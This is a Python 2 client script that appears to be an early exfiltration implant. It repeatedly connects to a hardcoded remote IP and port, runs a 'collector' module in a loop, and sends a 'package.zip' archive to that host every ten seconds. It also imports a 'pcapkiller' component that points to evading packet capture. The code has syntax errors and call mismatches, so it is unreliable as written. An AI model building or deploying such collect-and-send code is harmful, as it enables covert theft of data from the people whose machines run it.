#!/usr/bin/python

# TARGET IP:PORT    24.150.80.188 : 3000

import socket
import sys
import time
import os #for filesize Ryan
import collector
# not yet implemented in this program
from tear import pcapkiller
#

def createConnection(): #create connection to client Ryan
    success = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            # sock.connect(("localhost", 9999)) # for testing locally 
            sock.connect(('24.150.80.188', 3000))
            print '[+] Connected'
            success = 1
            break
        except socket.error:
            print '[-] Connection Refused - Retrying'
            time.sleep(5)

    if success == 1
        login(sock)

def login(sock): #login to the server Ryan
    #authCheck = open ("creds.txt", "r+")
    #if os.stat("creds.txt").st_size == 0
    while True:
        username = input('Enter your username: ')
        password = input('Enter your password: ')
        sock.send(username)
        sock.send(password)
        sock.send("")
        response = sock.recv(1024)
        print response
"""
    for userInfo in authCheck:
		if clientID == userInfo:
			if clientPWD == userInfo:
				if clientTOK = userInfo:
					threaded_client(conn)
					confUser = 1
				elif clientTOK == ""
					token = random.random(100000, 999999)
					conn.send(str.encode(token)
					userInfo.write(token)
					threaded_client(conn)
					confUser = 1

    data = conn.recv(1024)
	clientID = data#.decode('utf-8')
	data = conn.recv(1024)
	clientPWD = data
	data = conn.recv(1024)
	clientTOK = data
	confUser = 0
"""

def dispatch(sock):
    print '[*] Opening file'
    f = open('package.zip', 'rb')
    l = f.read(1024)
    print '[*] Sending file'
    while(l):
        sock.send(l)
        l = f.read(1024)

    f.close()
    sock.close()
    print '[*] SUCCESS'
    print '[*] Connection closed'

if __name__ == "__main__":
    collector.execute()
    createConnection() #Ryan
    #dispatch()
    
    # NOTE: need to modify to watch for certain messages(signals) sent from the server
    #       (ex. server sends REFRESH, client execute()'s and sends data)
    #       
    #       So the should be a constant connection between client and server or fork 
    #	    another process that waits for incoming connections and when it recieves
    #	    a Message from the server. It will send a signal to this process
    while True:
        #time.sleep(300)
        time.sleep(10)
        print 'collecting...'
        collector.execute()
        print 'sending...'
        dispatch()
